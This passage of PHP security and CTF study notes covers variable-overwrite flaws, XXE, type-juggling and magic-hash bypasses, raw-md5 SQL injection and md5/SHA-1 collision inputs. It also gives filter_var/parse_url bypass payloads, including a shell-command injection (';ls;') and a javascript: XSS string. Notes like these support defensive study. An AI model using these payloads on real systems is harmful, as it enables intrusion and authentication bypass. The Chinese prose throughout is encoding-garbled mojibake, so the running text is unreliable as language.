ï¼Œå¯ä»¥ç”¨ä»COOKIEã€POSTã€GETè·å¾—çš„ â€˜å‚æ•°=å€¼â€™ï¼Œæ¥è¦†ç›–ä¹‹å‰çš„æ‰€æœ‰å˜é‡ register_globals php.iniä¸­æœ‰ä¸€é¡¹ä¸ºregister_globalsï¼Œå³æ³¨å†Œå…¨å±€å˜é‡ï¼Œå½“register_globals=Onæ—¶ï¼Œä¼ é€’è¿‡æ¥çš„å€¼ä¼šè¢«ç›´æ¥çš„æ³¨å†Œä¸ºå…¨å±€å˜é‡ç›´æ¥ä½¿ç”¨ï¼Œè€Œregister_globals=Offæ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ°ç‰¹å®šçš„æ•°ç»„é‡Œå»å¾—åˆ°å®ƒã€‚ æ³¨æ„ï¼šregister_globalså·²è‡ª PHP 5.3.0 èµ·åºŸå¼ƒå¹¶å°†è‡ª PHP 5.4.0 èµ·ç§»é™¤ã€‚ å½“register_globals=Onï¼Œå˜é‡æœªè¢«åˆå§‹åŒ–ä¸”èƒ½å¤Ÿç”¨æˆ·æ‰€æ§åˆ¶æ—¶ï¼Œå°±ä¼šå­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼š &lt;?php echo \"Register_globals: \" . (int)ini_get(\"register_globals\") . \"&lt;br/&gt;\"; if ($a) { echo \"Hacked!\"; } ?&gt; é€šè¿‡GETå’ŒPOSTæ–¹å¼è¾“å…¥å˜é‡açš„å€¼ï¼ˆä¸å¥½æ­ç¯å¢ƒï¼Œç›´æ¥cväº†ï¼‰ï¼š å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä»COOKIEä¸­è¾“å…¥ï¼š extratct extract(array,extract_rules,prefix) extractå‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ è¯¥å‡½æ•°è¿”å›æˆåŠŸè®¾ç½®çš„å˜é‡æ•°ç›®ã€‚ arrayå¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚ extract_ruleså¯é€‰ã€‚extractå‡½æ•°å°†æ£€æŸ¥æ¯ä¸ªé”®åæ˜¯å¦ä¸ºåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åæ˜¯å¦å†²çªã€‚å¯¹ä¸åˆæ³•å’Œå†²çªçš„é”®åçš„å¤„ç†å°†æ ¹æ®æ­¤å‚æ•°å†³å®šã€‚ å¯èƒ½çš„å€¼ï¼šEXTR_OVERWRITE â€”â€”é»˜è®¤ã€‚å¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ &lt;?php $a = 1; $b = array('a'=&gt;'3'); extract($b); echo $a; //è¾“å‡ºä¸º3 ?&gt; parse_str parse_str(string, array) parse_strå‡½æ•°æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ã€‚æ³¨é‡Š:å¦‚æœæœªè®¾ç½®arrayå‚æ•°ï¼Œç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚ parse_strå‡½æ•°çš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶æ³¨å†Œæˆå˜é‡ï¼Œåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ç›´æ¥è¦†ç›–æ‰å·²æœ‰å˜é‡ stringå¿…éœ€ã€‚è§„å®šè¦è§£æçš„å­—ç¬¦ä¸²ã€‚ arrayå¯é€‰ã€‚è§„å®šå­˜å‚¨å˜é‡çš„æ•°ç»„åç§°ã€‚è¯¥å‚æ•°æŒ‡ç¤ºå˜é‡å­˜å‚¨åˆ°æ•°ç»„ä¸­ã€‚ &lt;?php $a = 1; parse_str('a=2'); print_r($a);//è¾“å‡ºä¸º2 ?&gt; mb_parse_str mb_parse_str()å‡½æ•°ç”¨äºè§£æGET/POST/COOKIEæ•°æ®å¹¶è®¾ç½®å…¨å±€å˜é‡ï¼Œå’Œparse_str()ç±»ä¼¼ï¼š &lt;?php $a = 'oop'; mb_parse_str($_SERVER[\"QUERY_STRING\"]); if ($a == 'mi1k7ea') { echo \"Hacked!\"; } else { echo \"Hello!\"; } ?&gt; import_request_variables bool import_request_variables(string $types[string$prefix] ) import_request_variableså°† GET/POST/Cookieå˜é‡å¯¼å…¥åˆ°å…¨å±€ä½œç”¨åŸŸä¸­; import_request_variableså‡½æ•°å°±æ˜¯æŠŠGETã€POSTã€COOKIEçš„å‚æ•°æ³¨å†Œæˆå˜é‡ï¼Œç”¨åœ¨register. globalsè¢«ç¦æ­¢çš„æ—¶å€™ $typeä»£è¡¨è¦æ³¨å†Œçš„å˜é‡ï¼ŒGä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIEï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æ³¨å†Œå˜é‡çš„å‰ç¼€ è¿™ä¸ªå‡½æ•°æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œè¯´æ˜¯PHP 5.3ä¹‹åå·²ç»å¼ƒç”¨ï¼Œåœ¨PHP 5.4ä¹‹åç§»å‡ºâ€”â€”çœ‹æ¥åŸºæœ¬ä¸ä¼šé‡è§äº† &lt;?php $auth = '0'; import_request_variables('G'); if($auth = 1){ echo \"private!\"; } else { echo \"public!\"; } //è¾“å…¥ï¼šwww.xxx.com?auth=1 //è¾“å‡ºï¼šprivate ?&gt; XXE simplexml_load_string å®ä¾‹ï¼š é—ªçµs-cmsï¼ˆè¿™é‡Œæˆ‘ç›´æ¥cväº† çœ‹åˆ°IFè¯­å¥è¿™è¾¹æ˜¯éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š$signature ä¸ç­‰äºç©ºã€$echostr ç­‰äºç©ºã€‚é€šè¿‡å…¨å±€æœç´¢å¯ä»¥çŸ¥é“äº† $signature æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ signatureï¼Œ$echosträ¹Ÿæ˜¯ æˆ‘ä»¬å¯ä»¥æ§åˆ¶simplexml_load_stringçš„å†…å®¹ï¼Œæ‰€ä»¥å­˜åœ¨XXEï¼Œå¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼š æ˜¾ç„¶è¿˜æœ‰å…¶ä»–å‡½æ•°ï¼Œæ—¥åé‡åˆ°ç»§ç»­æ€»ç»“ PHPç‰¹æ€§ in_array åœ¨åˆ¤æ–­ä¹‹å‰è‡ªåŠ¨åšç±»å‹è½¬æ¢ï¼ˆè·Ÿç€CTFé‡Œçš„çŸ¥è¯†å­¦ä¹ ï¼‰ è¿™é‡Œå¯ä»¥å¾ˆå®¹æ˜“ç†è§£å‡ºï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åæ˜¯1-24ä¸­çš„ä¸€ä¸ªï¼Œé‚£ä¹ˆå°±å°†æ–‡ä»¶è¿›è¡Œä¸Šä¼ ã€‚ä¸‹é¢æ˜¯in_array()å‡½æ•°çš„å®šä¹‰ã€‚ in_array ï¼š(PHP 4, PHP 5, PHP 7) åŠŸèƒ½ ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ å®šä¹‰ ï¼š bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) åœ¨ $haystack ä¸­æœç´¢ $needle ï¼Œå¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° $strict çš„å€¼ä¸º TRUE ï¼Œåˆ™ in_array() å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼Œæ£€æŸ¥ $needle çš„ç±»å‹æ˜¯å¦å’Œ $haystack ä¸­çš„ç›¸åŒã€‚å¦‚æœæ‰¾åˆ° $haystack ï¼Œåˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ²¡æœ‰è®¾ç½®ï¼Œé‚£å°±é»˜è®¤æ˜¯falseï¼Œä¹Ÿå°±æ˜¯å¼±æ£€æŸ¥ï¼Œç›¸å½“äºPHPå¼±æ¯”è¾ƒ== é‚£æˆ‘ä»¬åªéœ€è¦æ„é€ æ–‡ä»¶å7shell.phpï¼Œè¿™æ—¶in_arrayåœ¨åˆ¤æ–­çš„æ—¶å€™ï¼Œä¼šå°†7shell.phpå¼ºè½¬ä¸º7ï¼Œè€Œ7è‚¯å®šåœ¨range(1,24)ä¸­ï¼Œæœ€ç»ˆå°±èƒ½ç»•è¿‡é€ æˆä»»æ„æ–‡ä»¶ä¸Šä¼ ã€‚ï¼ˆè¿™é‡Œä¹‹æ‰€ä»¥ä¼šå‘ç”Ÿå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæ˜¯å› ä¸ºç›®æ ‡æ•°ç»„ä¸­çš„å…ƒç´ ä¸ºæ•°å­—ç±»å‹) tipsï¼šè¿™ä¸ªä¹Ÿä¸array_searchç›¸åŒï¼Œä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ is_numeric PHPæä¾›äº†is_numericå‡½æ•°ï¼Œç”¨æ¥å˜é‡åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ã€‚ä½†æ˜¯å‡½æ•°çš„èŒƒå›´æ¯”è¾ƒå¹¿æ³›ï¼Œä¸ä»…ä»…æ˜¯åè¿›åˆ¶çš„æ•°å­—ã€‚ä»»ä½•å‚æ•°åš16è¿›åˆ¶ç¼–ç ä¼ å…¥ï¼Œä¼šç›´æ¥é€šè¿‡(true)ï¼š16è¿›åˆ¶ä¼šè¢«åˆ¤æ–­ä¸ºæ•°å­— tipsï¼š%00å³ç©ºæ ¼ä¼šè¢«åˆ¤æ–­ä¸ºéæ•°å­—â€“&gt;å³ç›´æ¥è·³è¿‡æ£€æµ‹äº† æ¯”å¦‚ä¸‹å›¾çš„ä»£ç  è¦æ±‚å¯†ç ä¸èƒ½ä¸ºæ•°å­—ï¼Œä½†åˆå¾—ç­‰äº404ï¼Œæ„é€ password=404%00â€”â€”å³å¯ç»•è¿‡ é¦–å…ˆ404%00è¢«è®¤ä¸º404 ï¼ˆè¿™é‡Œæœ‰ç©ºæ ¼ï¼‰åˆ¤æ–­ä¸ºéæ•°å­—ï¼Œç»•è¿‡æ£€æµ‹ï¼Œåœ¨ä¸‹é¢åˆå› ä¸ºæ˜¯å¼±æ¯”è¾ƒï¼Œå®ƒè¢«è½¬ä¸º404ï¼Œè¾¾åˆ°ç›¸ç­‰æ¡ä»¶ã€‚ switch å¦‚æœswitchæ˜¯æ•°å­—ç±»å‹çš„caseçš„åˆ¤æ–­æ—¶ï¼ŒSwitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ &lt;?php $index = \"2abc\"; switch ($index) { case 0: echo \"it is 0\"; case 1: echo \"it is 1\"; case 2: echo \"it is 2\";//è¾“å‡ºit is 2 break; case 3: echo \"it is 3\"; default: echo \"no, you are a fw\"; md5ã€sha1 0eå¼€å¤´çš„å…¨éƒ¨ç›¸ç­‰ ï¼ˆ==åˆ¤æ–­ï¼‰â€”â€”MD5å’Œsha1ä¸€æ · md5('QNKCDZO') == md5(240610708)//true //MD5åŠ å¯†åä¼šå˜æˆè¿™ä¸ªæ ·å­ 0e830400451993494058024219903391 == 0e462097431906509019562988736854 ç”±äº0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè½¬æ¢ä¸º0ï¼Œæ‰€ä»¥çœŸæ­£æ¯”è¾ƒçš„è¿‡ç¨‹ä¼šå˜æˆè¿™æ ·0 == 0 å¸¸ç”¨çš„MD5åŠ å¯†åä»¥0Eå¼€å¤´çš„æœ‰ #0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 åŒ md5ï¼š $md5 md5($md5) 0e00275209979 0e551387587965716321018342879905 0e00506035745 0e224441551631909369101555335043 0e00540451811 0e057099852684304412663796608095 0e00678205148 0e934049274119262631743072394111 0e00741250258 0e899567782965109269932883593603 0e00928251504 0e148856674729228041723861799600 0e01350016114 0e769018222125751782256460324867 0e01352028862 0e388419153010508575572061606161 0e01392313004 0e793314107039222217518920037885 0e01875552079 0e780449305367629893512581736357 0e01975903983 0e317084484960342086618161584202 0e02042356163 0e335912055437180460060141819624 0e02218562930 0e151492820470888772364059321579 0e02451355147 0e866503534356013079241759641492 0e02739970294 0e894318228115677783240047043017 0e02760920150 0e413159393756646578537635311046 0e02784726287 0e433955189140949269100965859496 0e03298616350 0e851613188370453906408258609284 0e03393034171 0e077847024281996293485700020358 åˆ©ç”¨æ•°ç»„ç»•è¿‡ ï¼ˆ===åˆ¤æ–­ï¼‰ï¼šmd5ä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œä¼ å…¥æ•°ç»„ä¼šæŠ¥é”™ï¼Œä½†ä¼šç»§ç»­æ‰§è¡Œå¹¶ä¸”è¿”å›ç»“æœä¸ºnullâ€”â€”MD5å’Œsha1ä¸€æ · md5(a[]=1) === md5(b[]=1) //true //null === null sqlæ³¨å…¥â€”â€”md5ï¼ˆç¬¬äºŒä¸ªå‚æ•°è¢«è®¾ç½®ä¸º trueï¼‰ &lt;?php $password=$_POST['password']; $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0){ echo 'flag is :'.$flag; } else{ echo 'å¯†ç é”™è¯¯!'; } ç¬¬äºŒä¸ªå‚æ•°è®¾ç½®ä¸º true æ—¶ï¼Œ MD5 æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å› ?password=ffifdyop ï¼Œsql è¯­å¥è½¬æ¢ä¸º SELECT * FROM admin WHERE pass=' 'or ' 6'&lt;trash&gt; åŒæ · 129581926211651571912466741651878684928 md5 åä¸º T0Do#'or'8 ffifdyopçš„MD5åŠ å¯†ç»“æœæ˜¯ 276f722736c95d99e921722cf9ed621c ç»è¿‡MySQLç¼–ç åä¼šå˜æˆ'or'6xxx,ä½¿SQLæ’æˆç«‹,ç›¸å½“äºä¸‡èƒ½å¯†ç ,å¯ä»¥ç»•è¿‡md5()å‡½æ•°çš„åŠ å¯† md5ã€sha1å¼ºç¢°æ’ç»•è¿‡â€”â€”è¿™ç§æƒ…å†µæ˜¯åœ¨å¼ºæ¯”è¾ƒçš„æƒ…å†µä¸‹ï¼ŒåŠ äº†stringï¼ˆå¼ºè½¬ï¼‰â€”â€”ä¸€èˆ¬bpæŠ“åŒ…æ‰å¯ md5å¼ºç¢°æ’ä¾‹å­ psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2 ä¸ psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 è¿˜æœ‰ M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 ä¸ M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 ä¼¼ä¹è¿˜æœ‰ param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 shalå¼ºç¢°æ’ä¾‹å­ %25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 ä¸ %25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 $md5 == md5($md5)ï¼Œ0e+æ•°å­— md5 çˆ†ç ´è„šæœ¬ï¼š #!/usr/bin/env python import hashlib import re prefix = '0e' def breakit(): iters = 0 while 1: s = prefix + str(iters) hashed_s = hashlib.md5(s).hexdigest() iters = iters + 1 r = re.match('^0e[0-9]{30}', hashed_s) if r: print \"[+] found! md5( {} ) ---&gt; {}\".format(s, hashed_s) print \"[+] in {} iterations\".format(iters) exit(0) if iters % 1000000 == 0: print \"[+] current value: {} {} iterations, continue...\".format(s, iters) breakit() PHP ç‰ˆæœ¬ï¼š &lt;?php for($i=0;;$i++) if(\"0e{$i}\"==md5(\"0e{$i}\")) die (\"[+] found! 0e{$i}\"); elseif ($i % 1000000 === 0) echo \"[+] current value: {$i} \"; å¤„ç† INFï¼š var_dump(md5('INF')); //9517fd0bf8faa655990a4dffe358e13e var_dump(md5(9e999999));//9e999999å³INF //9517fd0bf8faa655990a4dffe358e13e å³å¯æ»¡è¶³ md5($this-&gt;trick1) === md5($this-&gt;trick2) ç»•è¿‡åŸç†ï¼šNANå’ŒINFï¼Œåˆ†åˆ«ä¸ºéæ•°å­—å’Œæ— ç©·å¤§ï¼Œä½†æ˜¯var_dumpä¸€ä¸‹å®ƒä»¬çš„æ•°æ®ç±»å‹å´æ˜¯doubleï¼Œé‚£ä¹ˆåœ¨md5å‡½æ•°å¤„ç†å®ƒä»¬çš„æ—¶å€™ï¼Œæ˜¯å°†å…¶ç›´æ¥è½¬æ¢ä¸ºå­—ç¬¦ä¸²â€NANâ€å’Œå­—ç¬¦ä¸²â€INFâ€ä½¿ç”¨çš„ï¼Œä½†æ˜¯å®ƒä»¬æ‹¥æœ‰ç‰¹æ®Šçš„æ€§è´¨ï¼Œå®ƒä»¬ä¸ä»»ä½•æ•°æ®ç±»å‹ï¼ˆé™¤äº†trueï¼‰åšå¼ºç±»å‹æˆ–å¼±ç±»å‹æ¯”è¾ƒå‡ä¸ºfalseï¼Œç”šè‡³NAN=NANéƒ½æ˜¯falseï¼Œä½†md5(â€˜NANâ€™)=md5(â€˜NANâ€™)ä¸ºtrueã€‚ï¼ˆ &lt;?php//INFåŒç† var_dump(md5('NAN') == md5('NAN')); $a = NAN; $b = NAN; var_dump($a == $b); //è¾“å‡ºbool(true) //bool(false) ?&gt; å¤„ç† 0.1*0.1ï¼š 0.1*0.1 å®é™…ä¸Šç”±äºæµ®ç‚¹æ•°å¤„ç†çš„åŸå› ï¼Œæ•°å€¼ä¸º 0.010000000000000002 çŒœæµ‹ md5 å‡½æ•°å¤„ç†æ—¶å¯¹å°æ•°çš„éƒ¨åˆ†è¿›è¡Œäº†èˆå¼ƒï¼Œæ‰€ä»¥ var_dump(md5(0.01)); //04817efd11c15364a6ec239780038862 var_dump(md5(0.1*0.1)); //04817efd11c15364a6ec239780038862 base64_encodeã€base64_decode åŒ sha1() å’Œ strcmp() filter_varã€parse_url filter_var â€” ä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡ï¼šæœ€å¸¸è§çš„æ˜¯FILTER_VALIDATE_URLè¿‡æ»¤å™¨ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„url filter_varå¯èƒ½å­˜åœ¨ä¸€äº›ç»•è¿‡ï¼š http://localhost/index.php?url=http://demo.com@sec-redclub.com http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com http://localhost/index.php?url=http://demo.com?sec-redclub.com http://localhost/index.php?url=http://demo.com/sec-redclub.com http://localhost/index.php?url=http://demo.com,sec-redclub.com http://localhost/index.php?url=http://demo.com:80;sec-redclub.com:80/ http://localhost/index.php?url=http://demo.com#sec-redclub.com\t//è¿™é‡Œçš„#éœ€è¦æ¢æˆ%23 ç»•è¿‡parse_urlå‡½æ•°ï¼Œéœ€è¦æ»¡è¶³$site_info['host']çš„å€¼ä»¥sec-redclub.comç»“å°¾ï¼Œpayloadï¼š http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/ æˆ‘ä»¬ä½¿ç”¨ payload ï¼š?url=javascript://comment``ï¼…250aalert(1) ï¼Œå¯ä»¥æ‰§è¡Œ alert å‡½æ•°ï¼š å®é™…ä¸Šï¼Œè¿™é‡Œçš„ // åœ¨JavaScriptä¸­è¡¨ç¤ºå•è¡Œæ³¨é‡Šï¼Œæ‰€ä»¥åé¢çš„å†…å®¹å‡ä¸ºæ³¨é‡Šï¼Œé‚£ä¸ºä»€ä¹ˆä¼šæ‰§è¡Œ alert å‡½æ•°å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºæˆ‘ä»¬è¿™é‡Œç”¨äº†å­—ç¬¦ %0a ï¼Œè¯¥å­—ç¬¦ä¸ºæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥ alert è¯­å¥ä¸æ³¨é‡Šç¬¦ // å°±ä¸åœ¨åŒä¸€è¡Œï¼Œå°±èƒ½æ‰§è¡Œã€‚å½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å¯¹ % ç™¾åˆ†å·ç¼–ç æˆ %25 ï¼Œå› ä¸ºç¨‹åºå°†æµè§ˆå™¨å‘æ¥çš„payloadï¼šjavascript://comment``ï¼…250aalert(1) å…ˆè§£ç æˆï¼š javascript://comment%0aalert(1) å­˜å‚¨åœ¨å˜é‡ $url ä¸­ï¼ˆä¸Šå›¾ç¬¬äºŒè¡Œä»£ç ï¼‰ï¼Œç„¶åç”¨æˆ·ç‚¹å‡»aæ ‡ç­¾é“¾æ¥å°±ä¼šè§¦å‘ alert å‡½æ•°ã€‚ strcmp int strcmp ( string $str1,string $str2) æ•°ç»„è·Ÿå­—ç¬¦ä¸²æ¯”è¾ƒè¿”å›0 å½“è¾“å…¥çš„ä¸¤ä¸ªå€¼ä¸æ˜¯å­—ç¬¦ä¸²æ—¶å°±ä¼šäº§ç”Ÿéé¢„æœŸçš„è¿”å›å€¼ &lt;?php $id=$_GET['id']; if(strcmp($secret,$id)==0){ echo 'success!'; } ç»•è¿‡åŸç†ï¼šåˆ©ç”¨strcmpå‡½æ•°å°†æ•°ç»„æˆ–è€…å¯¹è±¡ç±»å‹ä¸å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒä¼šè¿”å›-1ï¼Œä½†æ˜¯ä»5.3å¼€å§‹ï¼Œä¼šè¿”å›0 å½“ä¼ å…¥?id[]=1æ—¶å³å¯bypass array_search &lt;?php if(!is_array($_GET['test'])){exit();} // åˆ¤æ–­æ˜¯å¦ä¸ºæ•°ç»„ $test=$_GET['test']; for($i=0;$i&lt;count($test);$i++){ //éå†æ•°ç»„å†…å®¹ï¼Œæ‰€æœ‰å†…å®¹å‡ä¸èƒ½ä¸ºadminï¼Œç±»å‹ä¹Ÿå¿…é¡»ç›¸åŒ if($test[$i]===\"admin\"){ echo \"error\"; exit(); } $test[$i]=intval($test[$i]); //è½¬åŒ–ä¸ºintå‹ } if(array_search(\"admin\",$test)===0){ echo \"flag\"; } else{ echo \"false\"; } ?&gt; ç»•è¿‡åŸç†ï¼šarray_search() å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢æŸä¸ªé”®å€¼ï¼Œå¹¶è¿”å›å¯¹åº”çš„é”®åã€‚in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚åŸºæœ¬åŠŸèƒ½æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç»•è¿‡å§¿åŠ¿ä¹Ÿç›¸åŒã€‚åˆ©ç”¨å‡½æ•°æ¥å…¥åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹è¿”å›â€œ0â€è¿™ä¸ªç‰¹æ€§ï¼Œç›´æ¥ç»•è¿‡æ£€æµ‹ã€‚æ‰€ä»¥payloadï¼š?test[]=0ã€‚ trim å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ï¼Œä½†ä¸ä¼šè¿‡æ»¤è¿‡æ»¤\\f \" \" (ASCII 32 (0x20))ï¼Œæ™®é€šç©ºæ ¼ç¬¦ã€‚ â€œ\\tâ€ (ASCII 9 (0x09))ï¼Œåˆ¶è¡¨ç¬¦ã€‚ â€œ â€ (ASCII 10 (0x0A))ï¼Œæ¢è¡Œç¬¦ã€‚ â€œ\\râ€ (ASCII 13 (0x0D))ï¼Œå›è½¦ç¬¦ã€‚ â€œ\\0â€ (ASCII 0 (0x00))ï¼Œç©ºå­—èŠ‚ç¬¦ã€‚ 